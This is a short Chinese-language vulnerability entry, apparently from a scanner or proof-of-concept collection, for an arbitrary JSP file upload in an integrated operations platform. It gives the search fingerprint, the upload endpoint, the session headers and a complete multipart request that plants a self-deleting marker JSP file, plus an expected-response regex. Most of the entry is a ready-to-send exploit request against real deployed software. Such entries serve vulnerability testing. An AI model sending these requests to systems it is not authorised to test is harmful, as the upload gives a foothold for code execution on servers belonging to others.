# 北京中科聚网一体化运营平台resources任意文件上传

- **系统**：北京中科聚网一体化运营平台resources　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="一体化运营平台"`
- **请求**：`POST /resources/files/ue/word HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=9438c497-92ad-4800-b821-20602adec4ac; rememberMe=DQcKKIuzT47bdNWUqrwb…`　`Content-Type: multipart/form-data; boundary=----6fjhygvfu78fhvghkvr7842oib…`

**请求体 / payload**
```
------6fjhygvfu78fhvghkvr7842oibuvbiu
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
<% out.println("DudeSuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------6fjhygvfu78fhvghkvr7842oibuvbiu--
```
- **预期**：200　|　^(?=.*?files)(?=.*?jsp).*?$